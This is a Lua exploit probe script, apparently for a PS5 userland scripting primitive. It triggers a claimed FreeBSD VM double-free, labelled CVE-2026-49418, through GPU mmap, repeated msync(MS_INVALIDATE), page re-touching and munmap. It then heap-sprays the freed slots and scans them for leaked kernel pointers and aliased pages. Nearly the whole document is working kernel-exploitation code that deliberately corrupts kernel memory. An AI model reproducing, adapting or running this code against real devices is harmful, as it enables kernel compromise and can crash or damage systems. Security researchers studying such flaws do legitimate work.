-- CRASH_CLASS: RISKY (intentional kernel heap corruption — may panic)
-- PROBE 124b: CVE-2026-49418 DOUBLE-FREE TRIGGER
--
-- PREREQUISITE: 124a returned rv=0 for msync(MS_INVALIDATE) on GPU mmap.
--
-- Context: FreeBSD-SA-26:37.vm describes:
--   1. msync(MS_INVALIDATE) marks device pager pages invalid but leaves them
--      on the pager's page list
--   2. A page fault re-inserts those same pages → double entry in list
--   3. munmap/object destroy frees pages that are double-listed → UAF
--
-- This probe executes the full CVE sequence:
--   A: GPU mmap → write pattern → msync(MS_INVALIDATE) → re-touch → second msync
--   B: munmap the region (triggers free of double-listed pages)
--   C: Spray new allocations to land in freed slots
--   D: Read sprayed region for kernel metadata / dangling pointers
--
-- If the kernel panics at step B: the UAF is REAL and exploitable (we just
-- need to control timing). If it doesn't panic: the pages may not be
-- double-listed, or the free path handles it gracefully.

print("=== PROBE 124b: CVE-2026-49418 DOUBLE-FREE TRIGGER ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function failed(v)
    if type(v) == "table" and v.h == 0xFFFFFFFF then return true end
    return to_num(v) == 0xFFFFFFFF
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    return pcall(function() memory.write_dword(addr, val) end)
end
local function safe_wq(addr, val)
    return pcall(function() memory.write_qword(addr, val) end)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_mmap   = make_syscall(477)
local sc_msync  = make_syscall(65)
local sc_munmap = make_syscall(73)
local sc_getpid = make_syscall(20)

local PAGE = 0x4000
local MS_INVALIDATE = 2
local NUM_PAGES = 8
local MAP_SIZE = NUM_PAGES * PAGE

local ok0, pid0 = pcall(function() return sc_getpid() end)
print("[0] pid=" .. tostring(to_num(pid0)))

--------------------------------------------------------------------
-- SECTION A: Create mapping, invalidate, re-touch, invalidate again
--------------------------------------------------------------------
print("")
print("--- SECTION A: CREATE + INVALIDATE + RE-TOUCH + INVALIDATE ---")

-- Step 1: GPU mmap
local ok_map, base = pcall(function()
    return sc_mmap(uint64(0), uint64(MAP_SIZE), uint64(0x33),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("[A1] mmap ok=" .. tostring(ok_map) .. " base=" .. hex(base))
if not ok_map or failed(base) then
    print("STOP: mmap failed"); return
end

-- Step 2: Write known pattern
for i = 0, NUM_PAGES - 1 do
    safe_wd(to_num(base) + i * PAGE, 0xAA000000 + i)
end
print("[A2] wrote patterns to " .. NUM_PAGES .. " pages")

-- Step 3: FIRST msync(MS_INVALIDATE) — marks pages invalid, leaves on pager list
print("[A3] FIRST msync(MS_INVALIDATE)...")
local ok_ms1, rv_ms1 = pcall(function()
    return sc_msync(base, uint64(MAP_SIZE), uint64(MS_INVALIDATE))
end)
print("[A3] ok=" .. tostring(ok_ms1) .. " rv=" .. tostring(rv_ms1))
if not ok_ms1 or failed(rv_ms1) then
    print("STOP: first MS_INVALIDATE failed/blocked"); return
end

-- Step 4: Re-touch pages (triggers page fault → re-inserts into pager list)
print("[A4] re-touching pages (triggers page fault re-insertion)...")
local retouch_ok = 0
for i = 0, NUM_PAGES - 1 do
    local addr = to_num(base) + i * PAGE
    if safe_wd(addr, 0xBB000000 + i) then
        retouch_ok = retouch_ok + 1
    end
end
print("[A4] retouch_ok=" .. retouch_ok .. "/" .. NUM_PAGES)

-- Step 5: SECOND msync(MS_INVALIDATE) — double-invalidates the re-inserted pages
print("[A5] SECOND msync(MS_INVALIDATE)...")
local ok_ms2, rv_ms2 = pcall(function()
    return sc_msync(base, uint64(MAP_SIZE), uint64(MS_INVALIDATE))
end)
print("[A5] ok=" .. tostring(ok_ms2) .. " rv=" .. tostring(rv_ms2))

-- Step 6: Re-touch again before munmap (ensures pages are in list for free path)
print("[A6] final re-touch before munmap...")
for i = 0, NUM_PAGES - 1 do
    safe_wd(to_num(base) + i * PAGE, 0xCC000000 + i)
end

local ok_c1, pid_c1 = pcall(function() return sc_getpid() end)
print("[A7] pre-munmap canary pid=" .. tostring(to_num(pid_c1)))

--------------------------------------------------------------------
-- SECTION B: MUNMAP — triggers free of (potentially) double-listed pages
--------------------------------------------------------------------
print("")
print("--- SECTION B: MUNMAP (DOUBLE-FREE TRIGGER POINT) ---")
print("[B1] munmap base=" .. hex(base) .. " size=" .. MAP_SIZE)

local ok_unmap, rv_unmap = pcall(function()
    return sc_munmap(base, uint64(MAP_SIZE))
end)
print("[B1] ok=" .. tostring(ok_unmap) .. " rv=" .. tostring(rv_unmap))

local ok_c2, pid_c2 = pcall(function() return sc_getpid() end)
print("[B2] post-munmap canary: ok=" .. tostring(ok_c2) .. " pid=" .. tostring(to_num(pid_c2)))

if not ok_c2 then
    print("[!] PROCESS DIED AFTER MUNMAP — KERNEL CORRUPTION LIKELY")
    print("=== PROBE 124b COMPLETE ===")
    return
end

--------------------------------------------------------------------
-- SECTION C: HEAP SPRAY — land controlled data in freed page slots
--------------------------------------------------------------------
print("")
print("--- SECTION C: HEAP SPRAY (RECLAIM FREED SLOTS) ---")

local SPRAY_COUNT = 32
local spray_bases = {}
local spray_ok = 0
for i = 1, SPRAY_COUNT do
    local ok_s, s_base = pcall(function()
        return sc_mmap(uint64(0), uint64(PAGE), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if ok_s and not failed(s_base) then
        spray_ok = spray_ok + 1
        spray_bases[spray_ok] = s_base
        -- Write a marker to each spray page
        safe_wd(to_num(s_base), 0xDEAD0000 + i)
        safe_wd(to_num(s_base) + 8, 0xFACE0000 + i)
    end
end
print("[C1] spray_ok=" .. spray_ok .. "/" .. SPRAY_COUNT)

--------------------------------------------------------------------
-- SECTION D: SCAN SPRAY PAGES FOR KERNEL METADATA
--------------------------------------------------------------------
print("")
print("--- SECTION D: SCAN SPRAY PAGES FOR KERNEL POINTERS ---")

local kptr_count = 0
for i = 1, spray_ok do
    local addr = to_num(spray_bases[i])
    -- Scan first 256 bytes of each sprayed page
    for off = 0, 248, 8 do
        local qval = safe_rq(addr + off)
        if qval then
            local h, l = get_hi_lo(qval)
            -- Check for kernel pointer range (0xFFFF8xxx_xxxxxxxx)
            -- Exclude sentinels: 0xFFFFFFFF_00000000, 0xFFFFFFFF_FFFFFFFF
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                kptr_count = kptr_count + 1
                print("[D] KERNEL PTR at spray[" .. i .. "]+0x"
                    .. string.format("%X", off) .. ": " .. hex(qval))
            end
            -- Also check for non-zero unexpected values (not our markers)
            if h ~= 0 and l ~= 0
                and not (l >= 0xDEAD0000 and l <= 0xDEAD0040)
                and not (l >= 0xFACE0000 and l <= 0xFACE0040)
                and off < 16 then
                print("[D] unexpected at spray[" .. i .. "]+0x"
                    .. string.format("%X", off) .. ": " .. hex(qval))
            end
        end
    end
end
print("[D] total kernel pointers found: " .. kptr_count)

--------------------------------------------------------------------
-- SECTION E: Try to read/write the ORIGINAL munmapped region
-- (if pages were freed and reallocated to spray, this may alias)
--------------------------------------------------------------------
print("")
print("--- SECTION E: ORIGINAL REGION ALIAS CHECK ---")
local alias_count = 0
for i = 0, NUM_PAGES - 1 do
    local addr = to_num(base) + i * PAGE
    local v = safe_rd(addr)
    if v then
        alias_count = alias_count + 1
        -- Check if it contains our spray marker
        if v >= 0xDEAD0000 and v <= 0xDEAD0040 then
            print("[E] ALIAS DETECTED: old_page[" .. i .. "] contains spray marker 0x"
                .. string.format("%X", v))
        elseif v >= 0xCC000000 and v <= 0xCC000010 then
            print("[E] old_page[" .. i .. "] still has pre-munmap data 0x"
                .. string.format("%X", v))
        else
            print("[E] old_page[" .. i .. "] = 0x" .. string.format("%X", v)
                .. " (unknown — possible kernel metadata)")
        end
    end
end
print("[E] readable_old_pages=" .. alias_count .. "/" .. NUM_PAGES)

local ok_final, pid_final = pcall(function() return sc_getpid() end)
print("")
print("[FINAL] canary: ok=" .. tostring(ok_final) .. " pid=" .. tostring(to_num(pid_final)))

if kptr_count > 0 then
    print("")
    print("*** KERNEL POINTERS FOUND IN SPRAY — UAF CONFIRMED ***")
    print("*** CVE-2026-49418 IS EXPLOITABLE ON PS5 14.10 ***")
end

print("=== PROBE 124b COMPLETE ===")
